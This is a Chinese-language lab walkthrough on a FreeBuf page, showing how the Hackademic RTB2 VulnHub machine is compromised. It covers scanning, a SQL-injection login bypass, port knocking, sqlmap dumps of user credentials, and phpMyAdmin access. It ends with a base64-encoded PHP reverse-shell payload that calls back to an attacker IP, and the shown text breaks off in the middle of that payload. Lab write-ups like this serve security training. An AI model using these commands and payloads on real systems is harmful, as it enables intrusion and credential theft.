<head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head><script src="static/js/header/jquery.min.js?ver=3.6.1" type="text/javascript"></script>
<script src="static/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1" type="text/javascript"></script>
<script src="static/js/highslide/highslide-with-html.packed.js" type="text/javascript"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "static/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
<script language="JavaScript" src="static/buf/plugins/cartpauj-pm/js/script.js" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/layer.js"></script>
<script src="static/buf/plugins/simditor/highlight/highlight.pack.js" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="static/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="static/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="static/js/focus/bjqs-1.3.min.js" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript"></script>
<script src="static/js/new/setint.js" type="text/javascript"></script>
<script src="static/js/colum/swiper-3.4.2.min.js"></script>
<script type="application/ecmascript">
    $('.icon-wechat').hover(function(){
        $('.wechatImgdiv').show()
    },function(){
        $('.wechatImgdiv').hide()
    })
</script>
<script src="static/js/header/header.js" type="text/javascript"></script>
<script>
		jQuery(window).load(function () {
			jQuery(".main-header").sticky({topSpacing: 0});
		});
	</script>
<script>
                    $('.user-detial .test-info').mouseover(function() {
                        var _title = $(this).find('.text').attr('data-title');
                        if (_title) {
                            var str = '<span class="text-title">' + _title + '</span>';
                            $(this).append(str);
                        }
                    }).mouseout(function() {
                        $('.user-detial .test-info .text-title').remove();
                    });
                </script>
<script type="text/javascript">
				jQuery("#pagination a").live("click", function () {
					var _url = jQuery(this).attr("href");
					jQuery(this).parents("li").addClass("current").blur().parents("#menupage").find("li").not(jQuery(this).parents("li")).removeClass("current");
					jQuery.ajax({
						type: "POST",
						url: _url + "#timeline",
						success: function (data) {
							result = jQuery(data).find("#timeline .news_inner");
							nextHref = jQuery(data).find("#pagination a").attr("href");
							if (nextHref != undefined) {
								jQuery("#pagination a").attr("href", nextHref);
							} else {
								jQuery("#pagination").remove();
							}
							jQuery(function () {
								if (_url.indexOf("page") < 1) {
									jQuery("#timeline").html('');
								}
								jQuery("#timeline").append(result.fadeIn(200));
							});
						}
					});
					return false;
				});
			</script>
<script>
    $('.star_score > a').click(function() {
        $(this).addClass('active');
        $(this).siblings().removeClass('active');
    });
    $('.star_score > a').hover(function() {
        $(this).siblings().removeClass('active');
    });
    $(document).on('click', function() {
        $('.bottom_tools .tips-wrap').hide(500);
    });
    $('.bottom_tools ul li.fb-tips').click(function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $(this).find('.tips-wrap').toggle(500);
    });
    $('.bottom_tools .tips-wrap').click(function(event) {
        var evt = evt || event;
        evt.stopPropagation();
        $(this).show();
    });
    $('.feedback').on('click',function () {
        var content = $('#feedback-content').val();
        if(!content){
            $('#feedback-content').focus();
            $('.feedback-error').text('反馈内容不能为空！').show();
            return;
        }
        var contact = $('#feedback-contact').val();
        if(!contact){
            $('#feedback-contact').focus();
            $('.feedback-error').text('联系方式不能为空！').show();
            return;
        }
        var score = $('.star_score').children('.active').attr('data-id')
        if(!score){
            $('.feedback-error').text('给FreeBuf打个分吧！').show();
            return;
        }
        var yzm = $('#yzm').val();
        var _url = 'static/verify';
        $.ajax({
            type: "post",
            url: _url,
            data: {'content':content,'contact':contact,'score':score,'feedback_status':1,'yzm':yzm},
            success: function (data) {
                $("#captcha").trigger('click')
                if(data.code ==200){
                    layer.open({
                        title: '系统提示',
                        btnAlign: 'c',
                        content: data.msg,
                        area: '278px',
                    });
                }else {
                    layer.open({
                        title: '系统提示',
                        btnAlign: 'c',
                        content: data.msg,
                        area: '278px',
                    });
                }
            },
        })
    })

    $(document).on('click', '.appeal-wrap-public .appeal-main', function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $('.appeal-wrap-public').show();
    });
    $(document).on('click', '.appeal-main .close', function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $('.appeal-wrap').hide();
    });
    $(document).on('click', '.appeal-main .appeal-footer .btn-sure', function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $('.appeal-wrap-public').hide();
    });

    $('.complain').on('click',function () {
        var _url = 'static/verify';
        var token = $('#complain_token').val();
        $.ajax({
            type: "post",
            url: _url,
            data: {'complain_token':token,'complain_status':1},
            success: function (data) {
            },
        })
    })
</script>
<script src="static/js/new/backtop.js"></script>
<script type="text/javascript">
jQuery(function(){	
	jQuery('.tabPanes ul li').click(function(){
		jQuery(this).addClass('hit').siblings().removeClass('hit');
		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
	})
	jQuery('.vulbox-nav').click(function(e) { 
        e.stopPropagation(); 
    });  
})
</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
jQuery(function() {
    jQuery(".simditor pre").each(function(i, block){
        hljs.highlightBlock(block);    
    });
    hljs.initHighlightingOnLoad();
});
</script>
<script>
/* <![CDATA[ */
var rcGlobal = {
	serverUrl		:'static',
	infoTemp		:'%REVIEWER% on %POST%',
	loadingText		:'Loading',
	noCommentsText	:'No comments',
	newestText		:'&laquo; 最新',
	newerText		:'&laquo; 新一点',
	olderText		:'旧一点 &raquo;',
	showContent		:'1',
	external		:'1',
	avatarSize		:'32',
	avatarPosition	:'left',
	anonymous		:'Anonymous'
};
/* ]]> */
</script>
<script src="static/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3" type="text/javascript"></script>

<link href="static/buf/plugins/wp-favorite-posts/wpfp.css" id="wpfp-css" rel="stylesheet" type="text/css"/>
<link href="static/css/recentcomments/wp-recentcomments.css?ver=2.2.3" id="wp-recentcomments-css" media="screen" rel="stylesheet" type="text/css"/>
<link href="static/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1" id="mycred-widget-css" media="all" rel="stylesheet" type="text/css"/>
<link href="static/css/highslide/highslide.css" rel="stylesheet" type="text/css"/>
<link href="static/buf/plugins/cartpauj-pm/style/style.css" rel="stylesheet" type="text/css"/>
<link href=" static/buf/plugins/simditor/highlight/styles/default.css" rel="stylesheet" type="text/css"/>
<link href="https://static.freebuf.com/images/favicon.ico" rel="shortcut icon"/>
<link href="static/css/new/header.css" rel="stylesheet"/>
<link href="static/css/new/bootstrap.min.css?ver=2016051701" media="screen" rel="stylesheet"/>
<link href="static/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css"/>
<link href="static/css/new/style.css?ver=2018112123749359438534" rel="stylesheet" type="text/css"/>

<div id="contenttxt">
                            <h2>下载地址<br /></h2>
<p><a href="http://21ltr.com/scenes/21LTR.com_Scene1_2.120_v1.0.iso"></a></p>
<pre>https://download.vulnhub.com/hackademic/Hackademic.RTB2.zip
</pre>
<h2>实战演练</h2>
<p>下载完成后解压试用VMware虚拟机打开，可以看到登录界面，不需要登录。</p>
<p><img style="margin:15px auto;" alt="11.png" data-original="images/20190225/1551065585_5c7361f16dab6.png" src="images/20190225/1551065585_5c7361f16dab6.png" width="690" height="515" />对这个靶机系统，我使用kali进行测试。首先将两台虚拟机的网卡设置为桥接模式，kali系统使用netdiscover命令查找到靶机的IP为192.168.199.219</p>
<noscript><img style="margin:15px auto;" alt="11.png" src="images/20190225/1551065585_5c7361f16dab6.png" width="690" height="515" />对这个靶机系统，我使用kali进行测试。首先将两台虚拟机的网卡设置为桥接模式，kali系统使用netdiscover命令查找到靶机的IP为192.168.199.219</p></noscript>
<p><img style="margin:15px auto;" alt="QQ截图20190225113824.png" data-original="images/20190225/1551065927_5c736347b5505.png" src="images/20190225/1551065927_5c736347b5505.png" width="690" height="172" /></p>
<noscript><img style="margin:15px auto;" alt="QQ截图20190225113824.png" src="images/20190225/1551065927_5c736347b5505.png" width="690" height="172" /></p></noscript>
<p><span style="color:rgb(147,161,161);"><span style="color:rgb(51,51,51);">使用nmap命令查看靶机开放了什么端口，发现只开放80端口，看来入侵这个靶机系统是从web系统入手。</span></span></p>
<pre>nmap -sV -p1-65535 192.168.199.219</pre>
<p><img style="margin:15px auto;" alt="QQ截图20190225114102.png" data-original="images/20190225/1551066074_5c7363da3d1c3.png" src="images/20190225/1551066074_5c7363da3d1c3.png" width="690" height="170" />在火狐浏览器输入http://192.168.199.219，查看页面源代码没有发现账号密码泄露，使用burpsuite进行测试</p>
<noscript><img style="margin:15px auto;" alt="QQ截图20190225114102.png" src="images/20190225/1551066074_5c7363da3d1c3.png" width="690" height="170" />在火狐浏览器输入http://192.168.199.219，查看页面源代码没有发现账号密码泄露，使用burpsuite进行测试</p></noscript>
<p><img style="margin:15px auto;" alt="QQ截图20190225114344.png" data-original="images/20190225/1551066239_5c73647f4c679.png" src="images/20190225/1551066239_5c73647f4c679.png" width="690" height="392" />抓包，发送到repeater模块进行爆破</p>
<noscript><img style="margin:15px auto;" alt="QQ截图20190225114344.png" src="images/20190225/1551066239_5c73647f4c679.png" width="690" height="392" />抓包，发送到repeater模块进行爆破</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551066591_5c7365dfbedfb.png" src="images/20190225/1551066591_5c7365dfbedfb.png" width="690" height="356" />使用万能密码进行绕过&#8217; or 1=1&#8211;&#8217;  ，发现html页面有一堆信息，对其进行解密</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551066591_5c7365dfbedfb.png" width="690" height="356" />使用万能密码进行绕过&#8217; or 1=1&#8211;&#8217;  ，发现html页面有一堆信息，对其进行解密</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551067009_5c736781882a5.png" src="images/20190225/1551067009_5c736781882a5.png" width="690" height="281" />发送到decoder，进行解密</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551067009_5c736781882a5.png" width="690" height="281" />发送到decoder，进行解密</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551067389_5c7368fd4577d.png" width="690" height="484" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551067441_5c7369313f198.png" src="images/20190225/1551067441_5c7369313f198.png" width="690" height="197" />将二进制转换成ASCII码，网站：</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551067389_5c7368fd4577d.png" width="690" height="484" /><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551067441_5c7369313f198.png" width="690" height="197" />将二进制转换成ASCII码，网站：</p></noscript>
<pre>http://www.ab126.com/goju/1711.html</pre>
</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551068046_5c736b8e21440.png" src="images/20190225/1551068046_5c736b8e21440.png" width="512" height="698" />看到这几个数组，推测系统应该使用端口敲门服务</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551068046_5c736b8e21440.png" width="512" height="698" />看到这几个数组，推测系统应该使用端口敲门服务</p></noscript>
<pre>端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。<br /></pre>
<p>在kali终端输入shell脚本</p>
</p>
<pre>for port in 1001 1101 1011 1001;do nmap 192.168.199.219 -p $port ;done</pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551068702_5c736e1ea2116.png" src="images/20190225/1551068702_5c736e1ea2116.png" width="690" height="512" />接着继续用nmap</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551068702_5c736e1ea2116.png" width="690" height="512" />接着继续用nmap</p></noscript>
</p>
<pre>nmap -sS -sV -A 192.168.199.219</pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551068846_5c736eae0e4af.png" src="images/20190225/1551068846_5c736eae0e4af.png" width="690" height="360" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551068846_5c736eae0e4af.png" width="690" height="360" /></p></noscript>
<p>在火狐浏览器打开http://192.168.199.219:666</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551068952_5c736f18d749b.png" src="images/20190225/1551068952_5c736f18d749b.png" width="690" height="373" />由于这个web系统是joomla，我们使用joomscan来扫描</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551068952_5c736f18d749b.png" width="690" height="373" />由于这个web系统是joomla，我们使用joomscan来扫描</p></noscript>
</p>
<pre>joomscan -u http://192.168.199.219:666





    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://192.168.199.219:666 ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 1.5

[+] Core Joomla Vulnerability
[++] Joomla 1.5 Beta 2 - 'Search' Remote Code Execution
EDB : https://www.exploit-db.com/exploits/4212/

Joomla 1.5 Beta1/Beta2/RC1 - SQL Injection
CVE : CVE-2007-4781
EDB : https://www.exploit-db.com/exploits/4350/

Joomla 1.5.x - (Token) Remote Admin Change Password
CVE : CVE-2008-3681
EDB : https://www.exploit-db.com/exploits/6234/

Joomla 1.5.x - Cross-Site Scripting / Information Disclosure
CVE: CVE-2011-4909
EDB : https://www.exploit-db.com/exploits/33061/

Joomla 1.5.x - 404 Error Page Cross-Site Scripting
EDB : https://www.exploit-db.com/exploits/33378/

Joomla 1.5.12 - read/exec Remote files
EDB : https://www.exploit-db.com/exploits/11263/

Joomla 1.5.12 - connect back Exploit
EDB : https://www.exploit-db.com/exploits/11262/

Joomla Plugin 'tinybrowser' 1.5.12 - Arbitrary File Upload / Code Execution (Metasploit)
CVE : CVE-2011-4908
EDB : https://www.exploit-db.com/exploits/9926/

Joomla 1.5 - URL Redirecting
EDB : https://www.exploit-db.com/exploits/14722/

Joomla 1.5.x - SQL Error Information Disclosure
EDB : https://www.exploit-db.com/exploits/34955/ 

Joomla - Spam Mail Relay
EDB : https://www.exploit-db.com/exploits/15979/

Joomla 1.5/1.6 - JFilterInput Cross-Site Scripting Bypass
EDB : https://www.exploit-db.com/exploits/16091/

Joomla &lt; 1.7.0 - Multiple Cross-Site Scripting Vulnerabilities
EDB : https://www.exploit-db.com/exploits/36176/

Joomla 1.5 &lt; 3.4.5 - Object Injection Remote Command Execution
CVE : CVE-2015-8562
EDB : https://www.exploit-db.com/exploits/38977/

Joomla 1.0 &lt; 3.4.5 - Object Injection 'x-forwarded-for' Header Remote Code Execution
CVE : CVE-2015-8562 , CVE-2015-8566 
EDB : https://www.exploit-db.com/exploits/39033/

Joomla 1.5.0 Beta - 'pcltar.php' Remote File Inclusion
CVE : CVE-2007-2199
EDB : https://www.exploit-db.com/exploits/3781/

Joomla Component xstandard editor 1.5.8 - Local Directory Traversal
CVE : CVE-2009-0113
EDB : https://www.exploit-db.com/exploits/7691/



[+] Checking Directory Listing
[++] directory has directory listing : 

http://192.168.199.219:666/tmp

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://192.168.199.219:666/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.199.219:666/robots.txt 

Interesting path found from robots.txt

http://192.168.199.219:666/administrator/


http://192.168.199.219:666/cache/


http://192.168.199.219:666/components/


http://192.168.199.219:666/images/


http://192.168.199.219:666/includes/


http://192.168.199.219:666/installation/


http://192.168.199.219:666/language/


http://192.168.199.219:666/libraries/


http://192.168.199.219:666/media/


http://192.168.199.219:666/modules/


http://192.168.199.219:666/plugins/


http://192.168.199.219:666/templates/


http://192.168.199.219:666/tmp/


http://192.168.199.219:666/xmlrpc/

[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config file is found 
 config file path : http://192.168.199.219:666/configuration.php-dist



Your Report : reports/192.168.199.219:666/


</pre>
</p>
<p>我们使用这个漏洞</p>
<pre>Joomla Plugin 'tinybrowser' 1.5.12 - Arbitrary File Upload / Code Execution (Metasploit)
CVE : CVE-2011-4908
EDB : https://www.exploit-db.com/exploits/9926/</pre>
<p>使用msfconsole搜索joomla插件扫描poc</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551070104_5c737398cba82.png" src="images/20190225/1551070104_5c737398cba82.png" width="690" height="155" />进行扫描，在浏览器打开下面的URL，可以发现section参数存在注入漏洞</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551070104_5c737398cba82.png" width="690" height="155" />进行扫描，在浏览器打开下面的URL，可以发现section参数存在注入漏洞</p></noscript>
<pre>/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=' </pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551070782_5c73763e845ae.png" src="images/20190225/1551070782_5c73763e845ae.png" width="690" height="307" />使用sqlmap进行测试</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551070782_5c73763e845ae.png" width="690" height="307" />使用sqlmap进行测试</p></noscript>
<pre>sqlmap -u "http://192.168.199.219:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1" --dbs</pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551071214_5c7377ee16812.png" src="images/20190225/1551071214_5c7377ee16812.png" width="690" height="314" />查看joomla数据库</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551071214_5c7377ee16812.png" width="690" height="314" />查看joomla数据库</p></noscript>
<pre>sqlmap -u "http://192.168.199.219:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1" -D joomla --tables</pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551071354_5c73787a53314.png" src="images/20190225/1551071354_5c73787a53314.png" width="581" height="754" />查看用户表</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551071354_5c73787a53314.png" width="581" height="754" />查看用户表</p></noscript>
<pre>sqlmap -u "http://192.168.199.219:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1" -D joomla -T jos_users --columns</pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551071456_5c7378e08aeca.png" src="images/20190225/1551071456_5c7378e08aeca.png" width="614" height="362" />查看用户密码</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551071456_5c7378e08aeca.png" width="614" height="362" />查看用户密码</p></noscript>
<pre>sqlmap -u "http://192.168.199.219:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1" -D joomla -T jos_users -C username,password --dump</pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551071586_5c737962dc329.png" src="images/20190225/1551071586_5c737962dc329.png" width="690" height="114" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551071586_5c737962dc329.png" width="690" height="114" /></p></noscript>
<p>下载joomla的配置文件</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551072037_5c737b25a06e2.png" src="images/20190225/1551072037_5c737b25a06e2.png" width="690" height="22" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551072037_5c737b25a06e2.png" width="690" height="22" /></p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551072012_5c737b0c4ccf9.png" src="images/20190225/1551072012_5c737b0c4ccf9.png" width="690" height="642" />使用获取到root密码进入phpmyadmin</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551072012_5c737b0c4ccf9.png" width="690" height="642" />使用获取到root密码进入phpmyadmin</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551072129_5c737b81a2968.png" width="690" height="339" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551072146_5c737b92a8de6.png" src="images/20190225/1551072146_5c737b92a8de6.png" width="690" height="346" />写入测试文件</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551072129_5c737b81a2968.png" width="690" height="339" /><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551072146_5c737b92a8de6.png" width="690" height="346" />写入测试文件</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551072379_5c737c7b6e4ce.png" src="images/20190225/1551072379_5c737c7b6e4ce.png" width="690" height="204" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551072379_5c737c7b6e4ce.png" width="690" height="204" /></p></noscript>
<p></p>
<p>下载反弹shell</p>
<pre>http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz<br /></pre>
<p>将里面的PHP文件的&lt;?php 和 ?&gt;删除，修改IP为攻击机的IP，然后使用msfvenom进行base64加密</p>
<pre>root@kali:/opt/php-reverse-shell-1.0# msfvenom -p generic/custom -e php/base64 -f raw payloadfile=shell.php 
[-] No platform was selected, choosing Msf::Module::Platform from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 4630 (iteration=0)
php/base64 chosen with final size 4630
Payload size: 4630 bytes
eval(base64_decode(CnNldF90aW1lX2xpbWl0ICgwKTsKJFZFUlNJT04gPSAiMS4wIjsKJGlwID0gJzE5Mi4xNjguMTk5LjE3Nic7ICAvLyBDSEFOR0UgVEhJUwokcG9ydCA9IDEyMzQ7ICAgICAgIC8vIENIQU5HRSBUSElTCiRjaHVua19zaXplID0gMTQwMDsKJHdyaXRlX2EgPSBudWxsOwokZXJyb3JfYSA9IG51bGw7CiRzaGVsbCA9ICd1bmFtZSAtYTsgdzsgaWQ7IC9iaW4vc2ggLWknOwokZGFlbW9uID0gMDsKJGRlYnVnID0gMDsKCi8vCi8vIERhZW1vbmlzZSBvdXJzZWxmIGlmIHBvc3NpYmxlIHRvIGF2b2lkIHpvbWJpZXMgbGF0ZXIKLy8KCi8vIHBjbnRsX2ZvcmsgaXMgaGFyZGx5IGV2ZXIgYXZhaWxhYmxlLCBidXQgd2lsbCBhbGxvdyB1cyB0byBkYWVtb25pc2UKLy8gb3VyIHBocCBwcm9jZXNzIGFuZCBhdm9pZCB6b21iaWVzLiAgV29ydGggYSB0cnkuLi4KaWYgKGZ1bmN0aW9uX2V4aXN0cygncGNudGxfZm9yaycpKSB7CgkvLyBGb3JrIGFuZCBoYXZlIHRoZSBwYXJlbnQgcHJvY2VzcyBleGl0CgkkcGlkID0gcGNudGxfZm9yaygpOwoJCglpZiAoJHBpZCA9PSAtMSkgewoJCXByaW50aXQoIkVSUk9SOiBDYW4ndCBmb3JrIik7CgkJZXhpdCgxKTsKCX0KCQoJaWYgKCRwaWQpIHsKCQlleGl0KDApOyAgLy8gUGFyZW50IGV4aXRzCgl9CgoJLy8gTWFrZSB0aGUgY3VycmVudCBwcm9jZXNzIGEgc2Vzc2lv.biBsZWFkZXIKCS8vIFdpbGwgb25seSBzdWNjZWVkIGlmIHdlIGZvcmtlZAoJaWYgKHBvc2l4X3NldHNpZCgpID09IC0xKSB7CgkJcHJpbnRpdCgiRXJyb3I6IENhbid0IHNldHNpZCgpIik7CgkJZXhpdCgxKTsKCX0KCgkkZGFlbW9uID0gMTsKfSBlbHNlIHsKCXByaW50aXQoIldBUk5JTkc6IEZhaWxlZCB0byBkYWVtb25pc2UuICBUaGlzIGlzIHF1aXRlIGNvbW1vbiBhbmQgbm90IGZhdGFsLiIpOwp9CgovLyBDaGFuZ2UgdG8gYSBzYWZlIGRpcmVjdG9yeQpjaGRpcigiLyIpOwoKLy8gUmVtb3ZlIGFueSB1bWFzayB3ZSBpbmhlcml0ZWQKdW1hc2soMCk7CgovLwovLyBEbyB0aGUgcmV2ZXJzZSBzaGVsbC4uLgovLwoKLy8gT3BlbiByZXZlcnNlIGNvbm5lY3Rpb24KJHNvY2sgPSBmc29ja29wZW4oJGlwLCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAzMCk7CmlmICghJHNvY2spIHsKCXByaW50aXQoIiRlcnJzdHIgKCRlcnJubykiKTsKCWV4aXQoMSk7Cn0KCi8vIFNwYXduIHNoZWxsIHByb2Nlc3MKJGRlc2NyaXB0b3JzcGVjID0gYXJyYXkoCiAgIDAgPT4gYXJyYXkoInBpcGUiLCAiciIpLCAgLy8gc3RkaW4gaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgcmVhZCBmcm9tCiAgIDEgPT4gYXJyYXkoInBpcGUiLCAidyIpLCAgLy8gc3Rkb3V0IGlzIGEgcGlwZSB0aGF0IHRoZSBjaGl.sZCB3aWxsIHdyaXRlIHRvCiAgIDIgPT4gYXJyYXkoInBpcGUiLCAidyIpICAgLy8gc3RkZXJyIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvCik7CgokcHJvY2VzcyA9IHByb2Nfb3Blbigkc2hlbGwsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKTsKCmlmICghaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CglwcmludGl0KCJFUlJPUjogQ2FuJ3Qgc3Bhd24gc2hlbGwiKTsKCWV4aXQoMSk7Cn0KCi8vIFNldCBldmVyeXRoaW5nIHRvIG5vbi1ibG9ja2luZwovLyBSZWFzb246IE9jY3Npb25hbGx5IHJlYWRzIHdpbGwgYmxvY2ssIGV2ZW4gdGhvdWdoIHN0cmVhbV9zZWxlY3QgdGVsbHMgdXMgdGhleSB3b24ndApzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1swXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzFdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMl0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLCAwKTsKCnByaW50aXQoIlN1Y2Nlc3NmdWxseSBvcGVuZWQgcmV2ZXJzZSBzaGVsbCB0byAkaXA6JHBvcnQiKTsKCndoaWxlICgxKSB7CgkvLyBDaGVjayBmb3IgZW5kIG9mIFRDUCBjb25uZWN0aW9uCglpZiAoZmVvZigkc29jaykpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgY29ubmVjdGlvbiB0ZXJtaW5hdGVkIik7CgkJYn.JlYWs7Cgl9CgoJLy8gQ2hlY2sgZm9yIGVuZCBvZiBTVERPVVQKCWlmIChmZW9mKCRwaXBlc1sxXSkpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVkIik7CgkJYnJlYWs7Cgl9CgoJLy8gV2FpdCB1bnRpbCBhIGNvbW1hbmQgaXMgZW5kIGRvd24gJHNvY2ssIG9yIHNvbWUKCS8vIGNvbW1hbmQgb3V0cHV0IGlzIGF2YWlsYWJsZSBvbiBTVERPVVQgb3IgU1RERVJSCgkkcmVhZF9hID0gYXJyYXkoJHNvY2ssICRwaXBlc1sxXSwgJHBpcGVzWzJdKTsKCSRudW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVycm9yX2EsIG51bGwpOwoKCS8vIElmIHdlIGNhbiByZWFkIGZyb20gdGhlIFRDUCBzb2NrZXQsIHNlbmQKCS8vIGRhdGEgdG8gcHJvY2VzcydzIFNURElOCglpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSyBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHNvY2ssICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHBpcGVzWzBdLCAkaW5wdXQpOwoJfQoKCS8vIElmIHdlIGNhbiByZWFkIGZyb20gdGhlIHByb2Nlc3MncyBTVERPVVQKCS8vIHNlbmQgZGF0YSBkb3duIHRjcCBjb25uZWN0a.W9uCglpZiAoaW5fYXJyYXkoJHBpcGVzWzFdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVCBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzFdLCAkY2h1bmtfc2l6ZSk7CgkJaWYgK